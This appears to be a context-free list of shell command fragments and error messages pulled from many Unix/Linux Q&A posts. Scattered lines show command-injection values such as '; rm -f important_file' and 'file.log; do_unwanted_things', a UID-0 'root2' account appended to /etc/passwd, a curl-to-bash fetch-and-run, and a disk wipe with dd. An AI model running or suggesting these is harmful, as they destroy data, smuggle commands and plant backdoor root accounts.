something 'help
unexpected EOF
; rm -f important_file
'; rm -f important_file'
-- "$@"
-c 'shell code'
sh -c 'some shell code' sh
sudo su …
sudo su …
-- --
sudo -u jill timeout 99 sudo ... xx
man 1 watch
bash: cd: /run/user/1000/gvfs/: No such file or directory
VIM /etc/sysconfig/network
vi /etc/sysconfig/network-scripts/ifcfg-enp0s3
cat text.txt | sort
-t @
rm -i
find -exec
ls --color=auto
unbuffer … | tee … &
tee -a
tee -a
create-logging-tty 21 ./log
return 1
[ -t 21 ]
trap … EXIT
pv -qL 400 log
-not -path
-not -path "*/.*"
-name "*.*"
./test.awk 1.txt 2.txt
docker exec -i vim-plugin sh -c "vint ftplugin/terraform.vim"
sh -c …
vint …
docker exec …
docker exec
ls > list_of_files.log
Your code has been rated at 8.52/10
PYLINT_SCORE=$(sed -n 's#^Your code has been rated at \\([-0-9.]*\\)/.*#\\1#p' ./pylint/pylint.log)
source ~/.bashrc
source ~/.profile
which xds
which 2cbf
nano ~/.bash_login
gcreds --something
type gcreds
type -a gcreds
help type
type function
gcreds foo bar
gcreds …
something-else-than-gcreds …
bash: local: `[[': not a valid identifier
sort -u input.txt -o output.txt
LC_ALL=C sort -u
uchardet *.txt
rails s
ember s
gnome-terminal --tab -e "cd ~/code/myproject-ember"
cd ~/code/myproject-ember
cd ~/code/myproject-ember
gnome-terminal --tab -e "cd ~/code/myproject-ember"
cd ~/code/myproject-ember
cd …
linux version 5.8.0-1011-gcp
gnu bash 5.0.17(1)-release
xterm 353
printf '\[e[
/mnt/c/armcc.exe /mnt/c/test/foo.c
/mnt/c/armcc.exe /home/username/foo.c
"no source": Error:  #5: cannot open source input file
-b non-existing
'curl … {}; printf "%s %s\n" "$?" '
cut -d ":" f1
tr -d '[[:blank:]]'
-F :
man sed
wget "the update url"
-sh: pkg: not found
uname -a
Linux tc 2.6.36 #7 SMP Fri May 22 11:51:16 CST 2020 mips unknown
sh /home/linuxserver/Dokumente/shell.sh & disown; exit
& disown
& disown -h
user@pop-os:/run/user/1000/gvfs/smb-share:server=192.168.1.1,share=share_folder/Member Data$
cd //192.168.1.1/share_folder
cd smb://192.168.1.1/share_folder
bash -n
echo "Doing everything..."
grep (20606)
wc -l
sort -R
-m message
ifne -n
… | report foo
… | foo
[ -t 0 ]
report cat
ifne -n
bash -c 'some obscure code that handles the redirection' …
trap ':' INT TERM
alias report='report '
bash -c
mount-bkp.sh <password>
--passwd-fd 0
cat /path/to/password | ssh user@server /home/user/bkp/mount-bkp.sh
backup {}
backup {}
sudo nano /etc/paths
sudo nano /etc/paths
bash -n
continue 2
continue 2
while …
/sbin/init 6
/sbin/init $@
sftp ls
ls -1 */*
ls -1a */*
ls -1a */.*
(\/XXX[^ ]+)( .*)\1
. matches newline
read -p "enter..."
echo -e
\[\e]0;<some string>\a\]
Python3 cvt.py filename >newfile
split (/
[, \t]
 *
perl data.pl *.txt > newdata.txt
cd 
awk -v FS=, -v OFS=, '{ print $3, $2, $5 }'  < source.txt  > dest.txt
cd 
/etc/profile: line 78: ,: invalid function name
/regex/ s…
\@regex@ s…
du -hs *
shopt -s dotglob
argument list too long
-type d
! -name .
du -hs
-exec du … {} +
argument list too long
| more
| less
sudo -A
man 8 sudo
cat file
[WinError 267] The directory name is invalid
rename 's/[<>:]/-/g; s/["\\|\?*]/_/g;' *
git hook
git reflog --help
bin/magento setup:upgrade && bin/magento setup:di:compile && bin/magento cache:flush
mag_chain setup:upgrade setup:di:compile cache:flush
magento help && magento setup:upgrade
magento help setup:upgrade
php bin/magneto
TERM=xterm htop
/usr/local/bin/bash --rcfile ~/.bashrc
source ~/.iterm2_shell_integration.bash; osascript -e 'tell application "System Events" to keystroke "k" using command down'
source ~/.iterm2_shell_integration.bash
osascript -e 'tell application "System Events" to keystroke "k" using command down'
sudo apt-get update
cp -a SOURCE DEST
set -x
set -x
eval "$CONNINFO"
bash -c "$CONNINFO"
sh -c …
grep … | awk …
umount /dev/sdb1
mount -a
man fstab
sed '/12:30/,+5 d'
sed '/12:30/,/notify-send/d'
sed '/12:30\n^.*$\n^.*$\ntest notification\nnotification\nnotify-send/d' /tmp/notification_log
Read & execute
ALL APPLICATION PACKAGES
ALL RESTRICTED APP PACKAGES
dd if=/dev/zero of=/dev/$device bs=4096
diskutil secureErase
ps -ef
for f
for f in "$@"
source ~/.profile
$ source ~/.bashrc
$ vidlength
$ 1
$ NF
su <name> --login
su bob
su --login bob
su --login
WordPress version: 5.5.3 Database revision: 48748 TinyMCE version: 4.9100 (49100-20200624) Package language: en_US
/bin/rm /etc/someconfigfile
man sudoers
sudo bash -c 'dockerd &'
wsl sudo bash -c "dockerd &"
exec zsh
fdisk /dev/sdb
head -c 8G /dev/sdb > /dev/sdc
pv -Ss 8G /dev/sdb > /dev/sdc
aws lambda update-function-code
aws lambda update-function-code
apt-get install -y python-catkin-tools
apt-get install -y python-catkin-tools
apt-get install -y gnome-terminal
TERM=$TERM DEBIAN_FRONTEND=dialog apt-get install -y python-catkin-tools
apt-get install -y python-catkin-tools
wsl env
wsl env
bash info
sed -n '2 p'
gatsby cli
nvm -v
npm -v
Command not found
brew -v
brew reinstall <package>
netstat | awk '$4 ~ /xxx.xxx.xxx.xxx/ { ++count } END { print count }'
{ ++count } END { print count }
netstat | grep xxx.xxx.xxx.xxx -c
-m state
-m conntrack
ct state
env:PATH = (Get-Content path.txt)
/RFSniffer | /Rf_Test2.sh
no such file or directory
ssh-add ...
echo $?
eval "$(ssh-agent -s)"
eval "$(ssh-agent)"
echo $res
cat some_text_file | while read op rpt rec; do
cat some_file | awk '{...}' | while read ...
shopt -s lastpipe
[[ ]]
mv currently_written_file.txt daily-xx-xx-xx.txt & mv empty.file currently_written_file.txt
ln -s bar/foobar .
ln -s foobar ../
ln -s "pwd"/specavg_Pr1_ID15_20160201.fits "pwd"/../
man 1 ln
ln -s foobar ../
ln -s
foobar -> bar/foobar
ln -r
t=        9.90000    2    2
t= 9.90000 2 2
sed -i "s/${pattern}/${pattern2}/" output.xyz
( )
[ 0-9]{3}
sed -i
find -print0
cp -l
cp --backup=t
find -delete
rm -rf
[ -d "$dir" ] || continue
find -links 2
-links 2
( )
find "$dir" …
sh -c 'some shell code' sh
… && do_something_more_with "$dir"
if … then …
do_something_more_with "$dir"
{ }
do_something_more_with "$dir"
do_something_more_with .
echo "$dir"
printf "%s\n" "$dir"
find -exec
printf '%s\n'
head -c 1
head -c
find . -type d
Arch Linux, i3, xterm.
up arrow key.
up arrow key
up arrow key
scrot -s
export PS1='>'
 -n, --dry-run
$ rsync -avP source dest
myvar='/home/user/shares/D/iPhoto\ Library\ Main.migratedphotolibrary/Data.noindex/2002/102008\ \ name\ lname\ event/PICT0002_2_face0.jpg'
cat ${myvar}
cat "${myvar}"
cat /home/user/shares/D/iPhoto\ Library\ Main.migratedphotolibrary/Data.noindex/2002/102008\ \ name\ lname\ event/PICT0002_2_face0.jpg
report -n "Starting foo... "
report "Done"
exec >/dev/null
exec >/dev/null
Starting foo...
command echo
/path/to/the_script 3>&1 >/dev/null
echo "Done"
report "Done"
Starting foo...
Output file data = Copy first 512 bytes of input file - Skip 8 bytes - Copy second 512 bytes of input file- Skip 8 bytes --.
bs="$useful" count=1
wc -c
cp "Input file 1" "Output file 1"
./my_filter 512 8
mv: cannot move ‘hg/’ to a subdirectory of itself, ‘hg/hg’
Command not found
source activate
source activate
(venv) 
Set-ExecutionPolicy RemoteSigned
Add features
It's 
mkvirtualenv test
mkvirtualenv -p /usr/bin/python3.8 new_venv
$ echo $PATH | tr ':' '\n'
$ nano $HOME/.bash_aliases
$ sudo apt install nano
export PATH=$HOME/bin:$PATH
man chmod
$ chmod 755 $HOME/bin/filename
abc.sh  : rwsrw-r-x  owner -> main(user) main(group) 
myfile  : -rw-rw-r--  owner -> main(user) main(group)
ls -1
man ls
for f in ./*; do …
dir | my_parser
ls -C -b
-exec printf '%s\0' {} +
-maxdepth 1
\( -name . -o -prune \)
find starting_directory
! -path starting_directory
! -name .
-mindepth 1
sed 's|^\./||'
sed -z 's|^\./||'
case $ENVIRONMENT in
xargs -L 1
xargs -i
xargs -L 1
(error) CROSSSLOT Keys in request don't hash to the same slot
-exec echo
find -maxdepth 1
$(date -d "$(date +%Y-%m-01) -1 day" +%Y%m%d)
sort -t "." -n -k 2
sort -V
( )
mkdir archive || exit 1
mv * archive/
unset GLOBIGNORE
GLOBIGNORE=archive mv * archive/
-type d
source .bash_profile
docker exec
echo $FOO
echo $FOO
echo $FOO
echo 24136FOO
echo 24136FOO
echo "$FOO"
rsync -av --progress --remove-source-files
chmod a+x /path/to/mvrsync
cp && rm
sort -u
# vs # :
1 vs 2 : 0.214213,
1 vs 2 : ,0.214213
fzf <dir>
-C <dir>
ffmpeg -i desktop
taskkill /f
airmon-ng start wlan0
airmon-ng start wlan0
Case 1E
Case 1A
case 2A
Case 1x
Case 2x
Case 2B
Case 2F
Case 1E
typeset -p TEST1
declare -p TEST2
printf %s "$TEST1"
if [[ -e "$arg" ]]; then
chmodd …
find … -type d …
args for chmod
starting points
args for chmod
starting points
-maxdepth 3
3 -maxdepth
starting points
points starting
args for chmod
args for chmod
{} +
unbuffer bash > /dev/ttyACM0
unbuffer bash | /dev/ttyACM0
stdbuf -i0 -o0 bash > /dev/ttyACM0
history -c
C:\Program Files (x86)\cmder\config\.history
cmd /k
doskey /listsize=0
date -d
LC_TIME=C ls …
date -d
ls --quoting-style=
date -d
ssh -T git@github.com
ssh -vvv -T git@github.com
  +
column -ts $'\t'
column -ts "$(printf '\t')"
ARRAY=$(echo "a b c")
"a b c"
ARRAY=($(echo "a b c"))
ARRAY=($(echo "a b c"))
"a b c"
(a b c)
0 2>&1 >/dev/null
-Eao "\\+ title [0-9]+:" | wc -l)
-t 0
2>&1 >/dev/null
grep -Eao "\\+ title [0-9]+:" | wc -l
grep -Eao "\\+ title [0-9]+:"
wc -l
grep -Eao "\\+ title [0-9]+:"
foo=bar baz
baz && qux
PATH="$HOME/bin:$PATH" make
--enable-libvpx && \
--enable-nonfree \
PATH=… make
&& \
wsl.exe -l -v
su yourusername
wsl --set-default Ubuntu
wsl -d docker-desktop
XYZA, ZHF3, RTt2 etc.
sort -k.1.3,1.4
15AA, a2AA, 0CAA etc.
-type f
! -type d
! -name file1.log
-maxdepth 1
-maxdepth 1
man 1 find
-name . -o -prune
find … -print0 | xargs -r0 …
find … -print | xargs …
ssh usrname@ipaddress
set default
date +%H
2021-03-10 18:36:29 Thursday
set default
insmod datehook
2021-03-19 10:11:12
 
 
cat /proc/13458/fd/3
exec 3< <(command)
"source": "Windows.Terminal.Wsl"
"source": "Windows.Terminal.Wsl"
"source": "Windows.Terminal.Wsl"
wsl.exe ~
ssh -t -p 22222 root@device-ip "balena-engine exec -it <container_name> /bin/sh"
man 1 scp
-S program
chmod +x spy
scp …
scp …
balena-engine exec -it <container_name> scp …
scp … /remote/path/*
scp …
scp -S
chmod +x balena-helper
-P 22222 /local/file root@device-ip:/destination/
-P 22222
-p 22222
unalias scp
scp …
docker build -t MY_IMAGE_NAME .
-v /opt/ros/melodic/
docker build
"/bin/sh: 1: MY_COMMAND: not found"
WORKDIR /MY_PROJECT
cd /MY_PROJECT
RUN ["/bin/bash", "-c", "..."]
echo "$(docker ps -q)"
docker stop $(docker ps -q)
ps auxf | wc -l
ulimit -u
ulimit -u
ps auxf
your_processes + your_threads
your_processes + other_uid_processes
set +x
set -x
set -x
< /dev/null
ffmpeg ... < /dev/null
man 1 bash
echo "command three"
echo "command two"
s,\w+ ,&</>,g
crontab -e
% 
$ for f in `cat dirs.txt` ; do mv $f subdir; done  
ls | sort
directory actions on Linux
folder actions for Linux
cd ../dir
cd foo/bar
sudo -i
date +%a
env LC_TIME=en_US.UTF-8 date +%a
env LC_TIME=de_DE.UTF-8 date +%a
locale -a
xdotool getwindowfocus windowclose
setopt globstarshort
\\<server>.<domain>.eu\<share>$\<path>\Desktop\ 
Y:\Digitization\GitHub\Shell-Scripting\ 
Y:\Digitization\GitHub\Shell-Scripting\ 
source .xinitrc
Debian Buster
Debian Buster
vi ~/.xinitrc
bash ~/Applications/rustlinks.sh
gcc v7
sudo yum install -y centos-release-scl
sudo yum install -y devtoolset-7
gcc 7
scl enable devtoolset-7 bash
$SHELL -c "history -d 1000"
f *
f vim
f cd
f *
set completion-ignore-case On
$> des+[TAB]
$> Desktop/
grep -Eo "(?<=^mke_version ).*" file
grep: bad regex '(?<=^mke_version ).*': Repetition not preceded by valid expression
grep "^mke_version" file | awk -F"=" '{ print $1 }'
%windir%\system32\wsl.exe -cur_console:pm:/mnt --cd \\wsl$\Ubuntu\home\MyUser\MyProjectFolder
-new_console:d:\\wsl$\Ubuntu\home\MyUser\MyProjectFolder %windir%\system32\wsl.exe -cur_console:pm:/mnt
wsl ~
wsl --cd <WindowsDirectory>
wsl --cd C:\
wsl --cd \\wsl$\Ubuntu\home\myuser\myproject
chmod +x
nl -w2 -ba -s -d $'\n' filename
-s ''
-w 2
-b a
-s ''
-s ''
-s ""
No such file or directory
No such file or directory
help test
test -e
test -f
help [
nl …
[[ -f "$FILE" ]]
for f in …
shopt -s nullglob
[[ -f "$FILE" ]]
2>/dev/null cp …
cp -p error??????.mysite.at.txt error??????.mysite-dev.co.at.txt
cd /…/error
for f in error??????.mysite.at.txt; do …
cp -h
DOS Latin 1
DOS Latin 1
CP 850
DOS Latin 1
history <user>
Event Viewer
content=$(sudo cat secretfile.txt)
borg extract
borg mount
find … -exec test -e '{}/*.log'
sh -c 'some shell code' sh
-exec du …
exit 0
exit 1
-exec du …
test -e
test -f
| sort -rn |head
rm -d dirname
rm -R "$(dirname /tmp/*/Default)"
bash -c
wsl ssh ip
C:\Windows\System32\cmd.exe /k wsl /path/to/script.sh
export SHELL="bash"
Shell "bash" is not executable: No such file or directory
$( … )
command not found
export PATH=$PATH:/opt/myapp
bash: myapp: command not found
/bin/bash -c myapp version
bash: myapp: command not found
kill $(pidof shell)
kill -9 $(pidof shell)
pkill -HUP -t pts/1
argument list too long
sh -c 'some shell code' sh
sh -c
bash -c
Linux ThinkPad-E480 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
sudo -s
konsole --new-tab
xterm -e ssh -L
xterm -e ssh -L … &
ssh -N
ssh -f
ssh … &
-o ExitOnForwardFailure
-o ControlMaster=yes -o ControlPath=…
-MS …
-O exit
autossh … &
echo {} | sed -E 's/(.*)\.postfix$/\1/'
find . -name "10-*.conf.postfix" -exec mv '{}' {} \;
sed 's/\.postfix$//'
shopt -s globstar
find -name
for x in $(find)
Program\ Files
Program Files
strace -f su -c bash -c 'echo' |& grep 1024 -C 25
wsl --list
wsl --list
nohup bash update_script.sh
sleep infinity
sleep 9999d
echo $PATH
tar -f FILE
tar --file=FILE
while read
This does not look like a tar archive
head -c 1
dd bs=1 count=1 2>/dev/null
"This, has a comma","This has "quotes"",",but what if this happens "too""
"This has a comma","This has quotes","but what if this happens too"
awk 'BEGIN{FS=OFS=","} {for (i=1; i<=NF; i++) {gsub("\"","", $i)}}1' input.csv > output.csv
sudo printenv PATH
sudo su - USER2
sudo -i su - USER2
su - USER2
su -
sudo su - USER2
sudo -i -u USER2
cd "D:\my files\etc\etc"
cd D:/my\ files/etc/etc
which -a perl
od -c
od -c
echo "$length1 + $length2 - $fadeduration"
od -c
1 + 2 -
read -p 'Prompt... ' fadeduration
bind '"\302\240":" "'
bind '"\302\240"
302 240
od -c -
bind 'set enable-bracketed-paste off'
bind -v | grep bracketed
bind …
Open with text editor
sudo su - USER
sudo PATH=$PATH su - USER2
sudo PATH=$PATH -su USER2
sudo su - USER2
pip3 install --upgrade pip
WARNING: The scripts pip, pip3 and pip3.8 are installed in '/home/chills/.local/bin' which is not on PATH.
.profile: Permission denied
vim ~/.bash_profile
.profile: Permission denied
vim ~/.bash_profile
tmux list
tmux show-option -qvg escape-time
tmux list-sessions
tmux3.1b list
ambiguous command: list, could be: list-buffers, list-clients, list-commands, list-keys, list-panes, list-sessions, list-windows
tmux r
git diff
git add
./script.sh *.mp4
Using Common Lisp ...
sbcl --version
tr -d
echo -1-
sbcl --version
wc -l file.conf
cat file.conf
wc -l file.conf
cat file.conf
${line#* }
* 
${line#* }
${line#* }
shift 1
$variable name
and other stuff
ls -l
'foo "$1" bar'
D quotedS quotednot
quotedD quoted again
bash test.sh
* * * * * bash /home/me/test.sh
/usr/bin/gsettings set org.gnome.desktop.background picture-uri "file:///home/me/Downloads/apod.jpg"
echo $DBUS_SESSION_BUS_ADDRESS
pgrep gnome-session
source ~/.zshrc
stty -a
stty -a
stty onlcr
umask 026
umask 233
umask 233
read and write
read, write, and execute
umask 000
666 - (umask value) eg:  for umask of 022, the permission of a newly created file will be: 666 - 022 = 644 ,i.e -rw-r-r
777 - (umask value) eg: for a umask of 022, the permission of a newly created directory will be 777 - 022 = 755, i.e drwxr-xr-x
umask 026
umask 233
ls .*
du -s .*
du -s .[^.]*
du -s .*
du -s D*
du -s . D*
du -s D* .
chmod +x contraption
#!/usr/bin/env sh
IFS= read -r name
IFS= read -r line
test -f
</dev/tty cp -i
cp -i
sh -
#! /bin/sh -
Copy Image
dot -Tsvg | xclip -selection clipboard -t image/svg
ls -ld "${storage}"/* | wc -l
shopt -s failglob
shopt -s nullglob
shopt -s dotglob
argument list too long
set --
echo "$#"
argument list too long
unset dirs
-type d
wc -l
cd -- "$storage"/
! -path "$storage"
cd -- "$storage"/
sh -c 'some shell code' sh
! -name '.*'
-type d
shopt -s nullglob
   lig1,
cat "${csv}" | { head …
'   ID(lig)'
Command 'gmx' not found
bash /home/myuser/Downloads/GromacsDownload/gromacs-2021.2/build/gmxAssign.sh
echo "teststuff...
for … do … done &
kill -s USR1 "$bckgrndPID"
-b 5
getopts "b:h"
getopts "bh"
getopts "hb::"
sudo -s
cd /home
crontab -e
chmod +x myscriptlauncher.sh
sudo -s
crontab -e
pgrep mono
-b 50
2 days and 2 hours
-b 168
21 weeks
[[ ]]
set -m
foo () { … }
trap … INT
foo () ( … )
foo returns
declare -p var1 var2
print FILENAME, NR
sysctl vm.max_map_count
sysctl -w vm.max_map_count = 262144
sysctl -w vm.max_map_count=262144
-r 10
sed -E 's/(tig[0-9]{8}\_[0-9]{1})/ \1(tig[0-9]{8}) /' my_test.txt 
-exec command'{}' ';'
-exec command {} \;
name=muzi standalone=true
bash: ls: command not found
sh -c 'some shell code' sh
apk update && apk add application && application -f < /tmp/file.log
file='file.log; do_unwanted_things'
… < /tmp/file'.log
… < /tmp/file.log; do_unwanted_things
file.log; do_unwanted_things
ssh user@server code
sh -c
docker …
temp="$1"; file="$2"; 
mkdir $myvar && echo "done"
mkdir $myvar&& echo "done"
mkdir ${myvar} && echo "done"
mkdir $var &&
mkdir $var
cat file.sh | mongo …
<file.sh mongo …
man 1 mongo
mongo script1.js script2.js script3.js
mongo … file1
#!/usr/bin/env mongo
chmod +x file1
#!/usr/bin/env mongo
psql -f file2
psql <file2
man 1 psql
#!/path/to/psql -f
mongo …
psql -f -
<< EOF
<< 'EOF'
ALL = (ALL) ALL
sudo su -
C:/Program Files/Git/mingw64/libexec/git-core
git --exec-path
C:/Program Files/Git/mingw64/libexec/git-core
git core\git-subtree
git merge
git merge
git merge
merge: (b2 - not something we can merge
'-mmessage (b2 into b1)'
Esc than d
[[ ... ]]
ssh username@server -i .ssh/file
-bash: ssh username@server -i: command not found
whereis ssh
echo $PATH
export PATH=/usr/bin
sudo nano /etc/ssh/ssh_config
/usr/local/Cellar/openssh/8.6p1/bin/ssh username@server -i .ssh/file
dpkg-reconfigure krb5-config
apt purge
kdb5_util create -s
kadmin --local
echo , | sfdisk /dev/sdx
man sfdisk
sfdisk -s partition
sfdisk -l device
sfdisk -V device
sfdisk device
rsync $(tr '\n' ' ' < "rsyncfilepaths_small") /destination/path/
rsync -v --files-from=rsyncfilepaths rsync://ftp.ncbi.nlm.nih.gov /desination/path/
rsync v --files-from=rsyncfilepaths / /destination/path/
chmod u+x catalina.sh
man 5 crontab
maurice: command not found
flv \"rtmps://live-api-s.facebook.com:443/rtmp/xxx\"
bash: flv: command not found
STREAM=-f env
bash 2>file
bash 2>file
<script bash
bash 2>file
bash >file
bash 2> file
bash -i 2>file
exec 2>file
bash >file
bash >file
printf … >&2
export PATH="$PATH:my_path"
echo 'PATH="$PATH:my_path"' >> ~/.bash_profile
setopt nonomatch
-j 40
parallel … ::: "${urls[@]}"
argument list too long
Create new {Ubuntu} console
Me --> Bastion A --> Bastion B --> T
ssh T
Bastion B
ssh -A T
Me <-> Bastion B
ssh -A T
ssh T
ssh BastionB
shopt -s extglob
cat /var/log/httpd/localhost/httpd.log-+([0-9]) )
cat /var/log/httpd/localhost/httpd.log-+([0-9])
-a sub_folder
l subfolder
[ ! -z "$1" ]
--color always
--color always
--format long
-abT8 one --color two --format three --size four
-a -b -T 8 --color "" --format three --size -- one two four
saySomethingToSomebody Hello Adam
Hello Adam.
pl2303 converter
case `date +%a` in
locale's abbreviated weekday name
man date
read -u
<(…) { …; }
{ … }
shopt -s lastpipe
{ }
video="$(youtube-dl … | head -n 1)"
audio="$(youtube-dl … | …)"
date +%H:+%M
date +%H; date +%M
read -r video audio
< <(
<(process substitution)
ffmpeg -ss 00:06:00.00 -to 00:07:00.00 -i "$video_url" -ss 00:06:00.00 -to 00:07:00.00 -i "$audio_url" -c:v libx264 -preset ultrafast test.mkv
docker container inspect
mergeddir=$(docker inspect container_name | grep merged | cut -f 4 -d '"')
ls a:b
ls a\:b
crontab -e 
@reboot /home/kali/Desktop/project/start.sh
kdialog --menu
title element label element label ...
file A /dir/file A file B /dir/file B file C /dir/file C
"file A" "/dir/file A" "file B" "/dir/file B" "file C" "/dir/file C"
kdialog --menu title $LIST
`echo $LIST`
$(echo $LIST)
file\ A /dir/file\ A file\ B /dir/file\ B file\ C /dir/file\ C
man 1 xargs
bindfs …
sudo -u my_user bindfs …
sudo -u my_user
fusermount -u
sudo -u my_user
fusermount …
cd .
"git checkout - \n"
git checkout - 
bind -x '"\et":"git checkout -"'
bind '"\et":"git checkout - \n"'
_save_command_line; git checkout -
git checkout -
echo ""
echo "foo"
echo -n "some string"
[ "${1#-}" != "${1}" ]
[ -z "$(command -v "${1}")" ]
set -- node "$@"
exec "$@"
wsl --terminate Ubuntu
wsl -l -v
Measure-Command { wsl -e bash -noprofile -norc -c "echo Hello" }
apt-get install package
apt-get install ./package.deb
dpkg -i package.deb
ls -l | head -3 | tail - l
which speedtest-cli
find /volume6/Misc \( -name *.rar -o -name *.zip -o -name *.7z \)
find /volume6/Misc \( -name "*.rar" -o -name "*.zip" -o -name "*.7z" \)
inxi -Fx
history -s 'gcloud compute ssh [some-instance]  --internal-ip --ssh-flag="-o ServerAliveInterval=30"'
history -s [command]
history -s …
history -r
history -s …
setfacl -d -m g::rwx music/ ; setfacl -d -m o::--- music/
foo bar
var=foo' 'bar
var="foo\ bar"
var=foo\ bar
ubuntu 18.04
! -name '*.dlg'
-name '*.dlg'
-name '*.dlg'
-exec rm {} \;
find .
find .
openssl passwd test1
sudo echo "root2:rmeF3kdnoRw/U:0:0:root:/root:/bin/bash" >> /etc/passwd
bash: /etc/passwd: Permission denied
sudo nano /etc/passwd
sudo echo "root2:rmeF3kdnoRw/U:0:0:root:/root:/bin/bash" >> /etc/passwd
bash: /etc/passwd: Permission denied
sudo nano /etc/passwd
sudo bash -c 'echo "root2:rmeF3kdnoRw/U:0:0:root:/root:/bin/bash" >> /etc/passwd'
sudo bash
echo "root2:rmeF3kdnoRw/U:0:0:root:/root:/bin/bash" >> /etc/passwd
printf -v varname
sed -i '' ...
set -x
set +x
echo -e "\[\033[;33m\][\t \u (\#th) | \w]$\[\033[0m\]"
\[\][    \u (\#th) | \w]$\[\]
\[\033[;33m\][\t \u (\#th) | \w]$\[\033[0m\]
[21:55:17 {username} (89th) | {current directory path}]$
tar cf - /VARIABLE_1 -P | pv -s $(du -sb /VARIABLE_1 | awk '{print $1}') | gzip > VARIABLE_2.tar.gz
tarpb VARIABLE_1 VARIABLE_2
grep -q "$num" numbers.txt
grep "$num" numbers.txt
$( ... )
grep -q
rar: command not found
C:\Program Files\WinRAR\Rar.exe
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\WinRAR
uname -a
Pseudo-terminal will not be allocated because stdin is not a terminal.
find . -type f -name "*.vesp64" -print0 | xargs -0 ls -tl dir | head -n 1
uname -mp
eval "$(/opt/homebrew/bin/brew shellenv)"
sudo nano /etc/profile.d/autologout.sh
sudo chmod 0755 /etc/profile.d/autologout.sh
source /etc/profile.d/autologout.sh
rm -rf dir
rm -rf dir
rm *
read name
read last
name last
bash <(curl -s -L domain.com/myscript.sh)
tmux select-pane -L
tmux select-pane -L
zle -I
man zshzle
"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore"
cididunt ut"
Python 3.8.10
Ubuntu 20.04
[[ … =~ … ]]
^Python 
git ls-remote
git ls-remote
man 1 git
fatal: could not read Username for 'https://github.com': terminal prompts disabled
su user
sudo veracrypt -t -l
cat /tmp/mount
veracrypt -t -l
sudo veracrypt -t -l
veracrypt -d
su user -c 'whoami'
sudo journalctl -u keepalived -f 
echo "z1 z2"
echo -e
code main.rs
wsl --setdefault Ubuntu-20.04-copy01
wsl -d Ubuntu-20.04-copy01 -e bash --noprofile --norc
code .
echo $PATH
wsl --terminate Ubuntu-20.04-copy01
code .
powershell.exe get-childitem HKCU:
wsl.exe -u root service cron start
perl sbatch.pl <TAB>
<repo root>/.sh/zsh
mv path/to/src path/to/dest
. "$HOME/solana-release/bin"
source $HOME/.profile
bash: .: /home/longroad/solana-release/bin: is a directory
export PATH=$HOME/solana-release/bin:${PATH}
"source": "Windows.Terminal.Wsl"
-e command
grep --help
/etc/rc.d/rc.lxd-agent status
lxc exec slackware-vm -- sudo -i
-u 0
read -n '' -k 1 -u 0 somevar
# >>> conda initialize >>>
# <<< conda initialize <<<
ls -l ~
sudo chown -R "$UID" ~/foldername
2021_09_06 - 8 = 2021_08_98
-d @12345
-d "8 days ago"
cat {}
find /usr/local/var/www/html -depth -name "*.php.gz" -exec sh -c 'mv "$1" "${1%.php.gz}.php"' _ {} \;
echo ${test} | awk -F, '{for(i=1; i<=NF; ++i) print "ln -s", $i}' | /bin/bash
ls -U
ls -U
man ls
ls -U
ls -U
echo $VID
echo $ID
echo $VID
export VID=%
goosh my-search-string > my-text-file
start xxx
chsh -s /usr/local/bin/bash
npm pkg get version | sed 's/"//g'
${echo $1}
npm pkg get version | sed 's/"//g' | sed "s/1.0.0/$1/g" dist/style.css
npm pkg get version | sed 's/"//g'
jq -r .
sed -i "s/1\.0\.0/4.2beta/g"
sed -i "s/old/$(npm get | sed)/g" file
rm -i
rm -i
j, J, n, N
rm -i
LANG=de_DE.UTF-8 rm -i myFile
alias rm='LANG=de_DE.UTF-8 rm'
rm() { LANG=de_DE.UTF-8 command rm "$@"; }
sudo locale-gen
source (jenv init --no-rehash -|psub)
head -c
head -n 1
(stdin)= 
taskset core /bin/whatever
Local Computer Policy -> Computer Configuration -> Windows Settings ->  Security Settings -> Local Policies -> Log on as a batch job
powershell -c … &
powershell -c … &
unzip -p archive.zip file1.txt | less
filename not matched:
unzip -p ~/archive.zip ~/archive.zip/file1.txt | less
unzip -p ~/archive.zip ~/archive/file1.txt | less
filename not matched:
unzip -p ~/archive.zip file1.txt | less
man tmux
-T root
`for f in foo bar baz; do echo $f.c; done`
echo (foo bar baz)^(.c .h .o)
DISPLAY=:1 display my.jpg
cd / ;pwd
bash -c
/ ;pwd
bash -c cd / ;pwd
bash -c cd / ;pwd
cd /
bash -c "cd / ;pwd"
ssh …
bash -c
bash -c
bash -c …
cd / ;pwd
bash -c
ssh localhost "cd / ;pwd"
cd / ;pwd
bash -c
cd / ;pwd
bash -c
bash -c
bash -c
cd ~
ssh phil@<windows-host-ip>
ssh phili@<windows-host-ip>
ssh-copy-id phili@<windows-host-ip>
sudo su - -c "kill `ps -ef | grep 1.sh`"
ps -ef | grep 1.sh
pidof 1.sh | xargs sudo kill
sudo su - -c 'pkill -f 1.sh'
sudo su - -c "kill 
" 
PS1='[\u@\h \W]\$ '
PS1='\e[0;31m[\u@\h \W]\$ \e[m '
PS1='\e[0;31m\w \e[m
--login -i
--login -i
ldd /usr/bin/g++
(git ls-files)
echo a | cat <(echo b)
echo b
git ls-files
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now;tail -f /dev/null
echo "/bin/sh" | sudo at now; tail -f /dev/null
tail -f /dev/null
man bash
2>&1 |
2>&1 |
foo … |& bar
2>&1 |
foo … 2>&1 | bar
2>&1 |
>fifo … 2>&1
>/dev/null 2>&1
>/dev/null 2>&1
>fifo 2>&1 >/dev/null 2>&1
(foo 2>&1 >/dev/null) >fifo 2>&1
2>&1 |
2>&1 |
2>&1 |
kill $(cat /tmp/forward.pid)
Microsoft app store
subsystem layer for linux
kubectl logs
vim "$VIRTUAL_ENV"/Tab
vim $VIRTUAL_ENV/Ctrl+Alt+E
-bash: /.profile: No such file or directory
vcxsrv -ac
rm -rf
rm -i
sudo systemctl status telegraf | grep -e ● -e Active
sudo systemctl status telegraf --color=always | grep --color=never -e ● -e Active
systemctl: unrecognized option '--color=always'
sudo systemctl status telegraf | grep --color=never -e ● -e Active
grep --color=never …
grep --color=never …
man 8 sudo
man 5 sudoers
systemctl status …
RTNETLINK answers: Network is unreachable
var=$(command ...)
brew install --cask emacs
GNU Emacs 27.2
brew cask install emacs
which emacs
export PATH=/usr/local/opt/emacs-mac/bin:$PATH
